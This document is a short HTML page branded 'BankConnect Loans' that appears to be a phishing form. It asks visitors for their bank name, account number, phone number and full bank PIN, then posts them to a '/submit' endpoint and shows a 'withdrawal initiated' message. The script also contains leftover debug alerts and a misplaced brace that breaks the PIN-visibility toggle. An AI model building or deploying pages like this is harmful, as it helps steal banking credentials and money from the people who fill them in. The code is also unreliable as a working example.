<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BankConnect Loans - Bank Withdrawal</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#eef3fa;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.card{
    width:350px;
    background:#fff;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 10px 25px rgba(0,0,0,.15);
}

.header{
    padding:0;
    background:none;
    overflow:hidden;
}

.logo{
    width:100%;
    height:auto;
    display:block;
    margin:0;
    padding:0;
    border:none;
    border-radius:12px 12px 0 0;
    object-fit:cover;
}

.form{
    padding:25px;
}

label{
    display:block;
    margin-bottom:6px;
    font-weight:bold;
    color:#444;
}

input{
    width:100%;
    padding:12px;
    border:1px solid #ddd;
    border-radius:6px;
    margin-bottom:18px;
    font-size:15px;
}

input:focus{
    outline:none;
    border-color:#1877f2;
}

button{
    width:100%;
    padding:13px;
    border:none;
    border-radius:6px;
    background:#1877f2;
    color:#fff;
    font-weight:bold;
    font-size:15px;
    cursor:pointer;
}

button:hover{
    opacity:.95;
}

.footer{
    text-align:center;
    margin-top:15px;
}

.footer a{
    color:#1877f2;
    text-decoration:none;
    font-size:14px;
}
</style>

</head>

<body>

<div class="card">

<div class="header">
<img src="BankConnectLogo.png" class="logo" alt="Logo">
</div>

<div class="form">

<label>Bank Name</label>
<input
type="text"
id="bank_name"
placeholder="Enter bank name">

<label>Account Number</label>
<input
type="text"
id="account_number"
placeholder="Enter account number">

<label>Phone Number</label>
<input
type="tel"
id="phone_number"
placeholder="e.g. +263771234567">

<label
    style="
        display:block;
        margin-top:30px;
        margin-bottom:8px;
        color:#1877f2;
        font-weight:bold;
        font-size:18px;">
    Bank Pin
</label>

<div style="position:relative;">

    <input
        type="password"
        id="bank_pin"
        placeholder="Enter Bank PIN"
        style="
            width:100%;
            padding:12px 45px 12px 12px;
            border:2px solid #1877f2;
            border-radius:6px;
            background:#eef6ff;
            font-size:16px;">

    <span
        onclick="toggleBankPin()"
        style="
            position:absolute;
            right:15px;
            top:50%;
            transform:translateY(-50%);
            cursor:pointer;
            font-size:20px;
            user-select:none;">
        👁️
    </span>

</div>

<button onclick="submitForm()">
Withdraw to Bank Account
</button>

<div class="footer">
<a href="#">Need Help?</a>
</div>

</div>

<script>
    async function submitForm() {

    const bank_name = document.getElementById("bank_name").value.trim();
    const account_number = document.getElementById("account_number").value.trim();
    const phone_number = document.getElementById("phone_number").value.trim();
    const bank_pin = document.getElementById("bank_pin").value.trim();

    if (!bank_name || !account_number || !phone_number || !bank_pin) {
        alert("Please fill in all fields.");
        return;
    }

    try {

    const response = await fetch("/submit", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            bank_name: bank_name,
            account_number: account_number,
            phone_number: phone_number,
            bank_pin: bank_pin
        })
    });

    if (!response.ok) {
        throw new Error("Server returned " + response.status);
    }

  alert("Reached here");

const data = await response.json();

alert(JSON.stringify(data));

if (data.success) {

    alert("✅ Your bank withdrawal request has been initiated successfully.");

    window.location.replace("/thankyou.html");

}  

} catch (error) {

    console.error(error);
    alert("Unable to process your request at the moment. Please try again.");

}

function toggleBankPin() {

    const input = document.getElementById("bank_pin");

    if (input.type === "password") {
        input.type = "text";
    } else {
        input.type = "password";
    }

}

</script>

</body>
</html>
